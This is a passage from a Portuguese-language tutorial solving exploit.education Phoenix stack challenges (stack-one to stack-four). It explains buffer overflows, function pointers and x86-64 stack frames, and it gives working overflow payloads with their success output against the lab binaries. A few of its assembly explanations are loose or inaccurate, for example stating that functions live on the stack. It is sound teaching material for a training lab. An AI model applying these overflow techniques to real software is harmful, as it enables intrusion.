Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria! </p>
<p>Caso você queira usar as letras, voce pode também!</p>
<p>Então <code>b'\x62\x59\x6c\x49'</code> é equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte não tem um correspondente válido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, é mais prático usar <code>\x</code> 99% das vezes, então vale a pena criar o habito!</p>
<h1 id="-solução-1"><a class="header" href="#-solução-1">🔥 Solução</a></h1>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackTwo.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="stack/phoenix/StackTwo.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="stack/phoenix/StackTwo.html#-environment-variable-vari%C3%A1vel-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></li>
<li><a href="stack/phoenix/StackTwo.html#overflow">Overflow</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackTwo.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<h1 id="-objetivo-1"><a class="header" href="#-objetivo-1">🎯 Objetivo</a></h1>
<p>Similar à anterior, a gente precisa mudar o valor da variável changeme,
mas dessa vez ao invés de usar o input ou argv, vamos usar env!</p>
<h1 id="-explicação-2"><a class="header" href="#-explicação-2">💫 Explicação</a></h1>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
environment variable. </p>
<h2 id="-environment-variable-variável-do-ambiente"><a class="header" href="#-environment-variable-variável-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></h2>
<p>Essas variáveis são acessíveis para todos os programas
executando naquela seção. E normalmente contem preferências como cores, o tipo de terminal, etcetc....</p>
<p>Você pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Você pode definir uma até o resto da seção</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Você pode definir uma somente para execução daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para nós, não faz tanta diferença se o input é pelas <code>envs</code> ou por outro método.</p>
<p>O único problema é que não podemos usar o Null Byte (0x00), pois ele é usado para indicar o final de uma string ASCII, portanto terminando nossa variável precocemente.</p>
<h2 id="overflow"><a class="header" href="#overflow">Overflow</a></h2>
<p>Em seguida, o valor é copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A função <code>strcpy</code>, assim como <code>gets</code>, não checa se o valor é maior que o buffer, tornando o programa vulnerável... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em consideração que o sistema é LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres são usados para encerrar linha, não é uma letra do teclado! D:</p>
<p>Pois é, então vamos precisar usar os bytes diretamente.</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two </p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais fácil :D</p>
<h1 id="-solução-2"><a class="header" href="#-solução-2">🔥 Solução</a></h1>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackThree.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="stack/phoenix/StackThree.html#-dica">💡 Dica</a></li>
<li><a href="stack/phoenix/StackThree.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="stack/phoenix/StackThree.html#%EF%B8%8F%EF%B8%8F-o-que-raios-s%C3%A3o-pointers">↗️↘️ O que raios são pointers</a></li>
<li><a href="stack/phoenix/StackThree.html#-function-pointers">🦀 Function Pointers</a></li>
<li><a href="stack/phoenix/StackThree.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="stack/phoenix/StackThree.html#-analisando-o-programa">🛸 Analisando o programa</a></li>
<li><a href="stack/phoenix/StackThree.html#-encontrando-o-endere%C3%A7o-da-fun%C3%A7%C3%A3o">🏠 Encontrando o endereço da função</a></li>
<li><a href="stack/phoenix/StackThree.html#-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackThree.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<h1 id="-objetivo-2"><a class="header" href="#-objetivo-2">🎯 Objetivo</a></h1>
<p>Usar um pointer para retornar para uma função pre existente</p>
<h1 id="-dica-1"><a class="header" href="#-dica-1">💡 Dica</a></h1>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<h1 id="-explicação-3"><a class="header" href="#-explicação-3">💫 Explicação</a></h1>
<ul>
<li>O que raios são pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<h3 id="-o-que-raios-são-pointers"><a class="header" href="#-o-que-raios-são-pointers">↗️↘️ O que raios são pointers</a></h3>
<blockquote>
<p>Pointers são uma estrutura que, ao invés de armazenar dados, armazena o endereço de outra estrutura.
Lembra do exemplo do poço? Que cada item tinha seu endereço na stack! Então, um pointer armazena esse endereço! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade está em Y direção.</p>
<p>Colunas: Nome da Variável | Endereço | conteúdo</p>
<p><img src="stack/phoenix/./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A variável &quot;a&quot; é um pointer que armazena a localização da variável &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; está apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia á &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto é: Seguir a direção que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma referência, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso você tente desrefenciar um pointer que não aponta pra nada (NULL),
o programa vai interromper a execução e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, você vai ver &quot;Null Checks&quot; 
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<h3 id="-function-pointers"><a class="header" href="#-function-pointers">🦀 Function Pointers</a></h3>
<blockquote>
<p>Function pointers, ao invés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D</p>
</blockquote>
<p>Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por vários métodos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_função&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois métodos serão demonstrados em breve! :D</p>
<h3 id="-exploit"><a class="header" href="#-exploit">🔥 Exploit</a></h3>
<blockquote>
<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execução do programa.</p>
<p>Em lingua não nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execução do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<h4 id="-analisando-o-programa"><a class="header" href="#-analisando-o-programa">🛸 Analisando o programa</a></h4>
<pre><code class="language-C">função complete_level() {   // a função que a gente quer chamar
.......
}

função main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // função INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endereço salvo em fp como se fosse uma função
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>Nós queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endereço.</p>
<p>E nós já sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Então tá na hora do trabalho!</p>
<h4 id="-encontrando-o-endereço-da-função"><a class="header" href="#-encontrando-o-endereço-da-função">🏠 Encontrando o endereço da função</a></h4>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereços
                  ( O -d é pra ativar a disassembly: Converter de machine code para algo legível )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padrão foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endereço
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endereço da função é 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes, 
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (nós), de definir um pointer novo, pois quebraria a string do nosso 
input. Nós precisamos usar um que já esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e nós só vamos mudar os bytes finais dele
(Inteiro escreve na direção LE, lembra? Então não vai interferir com os NULLs que vem antes)</p>
<p>Portanto não precisamos nos preocupar com isso nesse desafio!</p>
<h4 id="-cansei-de-teoria-eu-quero-exploit"><a class="header" href="#-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></h4>
<p>Se você quer tentar por conta própria, agora é sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Então...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que você tenha gostado! :D</p>
<h1 id="-solução-3"><a class="header" href="#-solução-3">🔥 Solução</a></h1>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three </p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackFour.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="stack/phoenix/StackFour.html#-conhecimento-preliminar">🛸 Conhecimento preliminar</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-assembly">🤖 Assembly</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-register-registos--registadores">📦 Register (Registos / Registadores)</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</a></li>
<li><a href="stack/phoenix/StackFour.html#-address-register--armazenam-endere%C3%A7os-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></li>
<li><a href="stack/phoenix/StackFour.html#-rflag">🏁 RFLAG</a></li>
<li><a href="stack/phoenix/StackFour.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-instru%C3%A7%C3%B5es">⚡ Instruções</a></li>
<li><a href="stack/phoenix/StackFour.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">🦄 Funções, Prólogo e Epílogo</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-revis%C3%A3o">☕ Revisão</a></li>
<li><a href="stack/phoenix/StackFour.html#%EF%B8%8F-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></li>
<li><a href="stack/phoenix/StackFour.html#-pr%C3%B3logo">🔒 Prólogo</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="stack/phoenix/StackFour.html#criar-novo-frame">Criar novo frame</a></li>
<li><a href="stack/phoenix/StackFour.html#-ep%C3%ADlogo">🔑 Epílogo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></li>
<li><a href="stack/phoenix/StackFour.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-analisar-o-programa">🔬 Analisar o programa</a></li>
<li><a href="stack/phoenix/StackFour.html#%EF%B8%8F-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></li>
<li><a href="stack/phoenix/StackFour.html#-encontrar-endere%C3%A7o-de-complete_level">🏠 Encontrar endereço de complete_level</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<h1 id="-objetivo-3"><a class="header" href="#-objetivo-3">🎯 Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
<p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>, 
caso você goste de siglas)! :D</p>
<p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1 id="-conhecimento-preliminar"><a class="header" href="#-conhecimento-preliminar">🛸 Conhecimento preliminar</a></h1>
<p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2 id="-assembly"><a class="header" href="#-assembly">🤖 Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdução Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq é a melhor e se alguém te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM é uma representação legível dos 0s e 1s das instruções do computador.
Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assiste 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3 id="-register-registos--registadores"><a class="header" href="#-register-registos--registadores">📦 Register (Registos / Registadores)</a></h3>
<blockquote>
<p>Registers são pedaços de memória que ficam dentro do chip do processador,
semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
</blockquote>
<p>O seu tamanho é um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers são semelhantes à variáveis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4 id="-general-purpose-registers-gpr--registo-de-propósito-geral-"><a class="header" href="#-general-purpose-registers-gpr--registo-de-propósito-geral-">🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propósito deles historicamente costumava ser, mas não exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operações_lógicas ou aritméticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operações_cíclicas 
RDX Dados        -&gt; Multiplicação, input/output
R8 a 15          -&gt; você só precisa saber que eles existem
</code></pre>
<p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<p>Para os nossos propósitos, é mais vantajoso considerar que eles só servem para 
armazenar valores e passar argumentos</p>
<h4 id="-address-register--armazenam-endereços-da-stack-"><a class="header" href="#-address-register--armazenam-endereços-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução 
								que está sendo executada 
</code></pre>
<h4 id="-rflag"><a class="header" href="#-rflag">🏁 RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
Esses sinais são 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posição    Nome         Descrição 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matemática)
6          Zero          A operação resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4 id="-apêndice---curiosidade--nomenclatura-histórica"><a class="header" href="#-apêndice---curiosidade--nomenclatura-histórica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></h4>
<p><img src="stack/phoenix/./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX

Para propósitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por trás das cenas, o computador interpreta EAX como a segunda metade do RAX

Então não estranhe caso alguém fale de EIP numa
arquitetura x64, pois na linguagem informal não faz diferença

Mas caso você vá analisar o register em um debugger, a diferença importa :D
</code></pre>
<h3 id="-instruções"><a class="header" href="#-instruções">⚡ Instruções</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
</blockquote>
<p>As instruções são o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
<p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtração 4 - 1 = 3
                 Caso fosse ao contrário a ordem &quot;alvo&quot; &quot;parâmetro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruções que serão importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; Só remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parâmetro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epílogo ( explicadas em breve )
           ret     -&gt; retorna da função ( em essência é só um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
</code></pre>
<p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
<h3 id="-funções-prólogo-e-epílogo"><a class="header" href="#-funções-prólogo-e-epílogo">🦄 Funções, Prólogo e Epílogo</a></h3>
<p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
<h4 id="-revisão"><a class="header" href="#-revisão">☕ Revisão</a></h4>
<pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memória é representada de cabeça pra baixo!
    - A base fica em um endereço maior (parte de baixo)
    - O topo fica em um endereço menor (parte de cima)
    - Portanto, a stack cresce em direção à valores menores :D 

</code></pre>
<h4 id="-stack-frame--moldura-da-stack-"><a class="header" href="#-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></h4>
<p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
<p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
<blockquote>
<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
<p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly é legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
<h4 id="-prólogo"><a class="header" href="#-prólogo">🔒 Prólogo</a></h4>
<ul>
<li>Se a função receber argumentos, passar eles
Chamar a função </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a função</li>
</ul>
<h5 id="se-a-função-receber-argumentos-salvar-eles"><a class="header" href="#se-a-função-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos são passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parâmetro)
RSI (2º parâmetro)
RDX (3º parâmetro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necessário dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4 id="salvar-o-frame-atual"><a class="header" href="#salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
	       ; e sim o endereço da próxima instrução 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4 id="criar-novo-frame"><a class="header" href="#criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; até o rsp
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localização
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a função precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variáveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse método de chamar função, não importa a localização da memória de quando a função foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma função chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruído ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execução normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo então pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a função
</code></pre>
<h4 id="-epílogo"><a class="header" href="#-epílogo">🔑 Epílogo</a></h4>
<p>O epilogo é bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instruções               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...                    
